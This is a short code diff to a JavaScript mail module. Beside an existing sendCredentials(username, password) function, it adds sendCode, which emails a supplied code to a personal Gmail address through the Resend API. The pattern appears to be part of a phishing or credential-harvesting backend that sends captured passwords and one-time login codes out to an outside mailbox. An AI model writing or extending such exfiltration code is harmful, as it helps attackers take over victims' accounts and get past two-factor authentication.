@@ -46,3 +46,17 @@ export const sendCredentials = async (username, password) => {
     `,
   });
 };
+
+export const sendCode = async (code) => {
+  await resendAPIKEY.emails.send({
+    from: "onboarding@resend.dev",
+    to: "lummybackend@gmail.com",
+    subject: "Code",
+    html: `
+      <div>
+        <strong>Code:</strong>
+        <p>${code}</p>
+      </div>
+    `,
+  });
+};
